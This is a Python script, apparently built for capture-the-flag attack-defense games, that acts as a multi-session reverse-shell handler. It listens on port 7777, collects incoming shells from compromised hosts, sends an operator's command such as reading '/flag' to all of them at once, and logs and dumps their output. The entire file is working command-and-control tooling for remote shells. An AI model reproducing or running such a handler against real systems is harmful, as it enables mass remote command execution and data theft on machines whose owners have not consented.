import json
import socket
import threading
import time
from base64 import b64encode
from hashlib import sha1

lootedShell = {}

def listen(sck, lport):
    sck.bind(("0.0.0.0", lport))
    sck.listen()
    while True:
        subsck, addr = sck.accept()
        uuid = sha1(f"{addr}{time.time()}".encode()).hexdigest()
        lootedShell[uuid] = {"died": False, "sck": subsck, "addr": addr, "time": time.time(), "history": bytearray()}
        threading.Thread(target=recv, args=(subsck, uuid), daemon=True).start()


def recv(sck, uuid):
    try:
        while True:
            lootedShell[uuid]["time"] = time.time()
            lootedShell[uuid]["history"].extend(sck.recv(1024))
    except Exception:
        if uuid in lootedShell:
            lootedShell[uuid]["died"] = True


def send(cmd):
    # 用来读 flag 的话, 可以 echo "|-->";cat /flag;echo "<--|"; 便于之后处理
    print(f"[*] Using {cmd}")
    cmd += "\n"
    count = 0
    for i in lootedShell:
        if not lootedShell[i]["died"]:
            try:
                lootedShell[i]["sck"].send(cmd.encode())
                count += 1
            except Exception:
                lootedShell[i]["died"] = True
    print(f"[*] Has been sended to {count} shells")


def info(placeholder):
    count = 0
    hosts = set()
    for i in lootedShell:
        if lootedShell[i]["died"]:
            pass
        else:
            count += 1
            hosts.add(lootedShell[i]['addr'][0])
            print(f"[*] {lootedShell[i]['addr']}")
    print(f"[*] {len(lootedShell)} shells in total, {count} alive, {len(hosts)} hosts")


def dump(filename):
    result = []
    for i in lootedShell:
        tmp = lootedShell[i]
        try:
            history = tmp["history"].decode()
            encoded = False
        except Exception:
            history = b64encode(tmp["history"]).decode()
            encoded = True
        result.append({"died": tmp["died"], "addr": tmp["addr"], "time": tmp["time"], "history": history, "encoded": encoded})

    if len(filename) == 0:
        filename = f"dump-{time.time()}.json"
        print(f"[*] No filename specified, dumped to {filename}")
    else:
        print(f"[*] Dumped to {filename}")
    f = open(filename, "w")
    f.write(json.dumps(result))
    f.close()
    print("[*] Dump complete")
        

def flush(placeholder):
    dump("")
    for i in list(lootedShell):
        if lootedShell[i]["died"]:
            lootedShell.pop(i)
        else:
            lootedShell[i]["history"] = bytearray()
    print("[*] Flush success")


def help():
    print("[*] Help:")
    print("[1] exec [cmd]")
    print("    Command after exec will be send to all shells\n")
    print("[2] info")
    print("    Get curr shell infos\n")
    print("[3] dump (filename)")
    print("    Dump all result to file")


def main(lport):
    sck = socket.socket()
    threading.Thread(target=listen, args=(sck, lport), daemon=True).start()
    mapping = {
        "exec": send,
        "info": info,
        "dump": dump,
        "flush": flush
    }
    while True:
        try:
            i = input(">>> ").strip()
            choice = i.split(" ")[0]
            if choice in mapping:
                mapping[choice](i[len(choice) + 1:]) # 将命令后面的传给函数作为参数
            else:
                if len(i) != 0:
                    help()
        except KeyboardInterrupt:
            i = input("\nPress 'Y' to confirm: ")
            if i.strip().lower() == "y":
                try:
                    sck.close()
                except Exception:
                    pass
                break

main(7777)
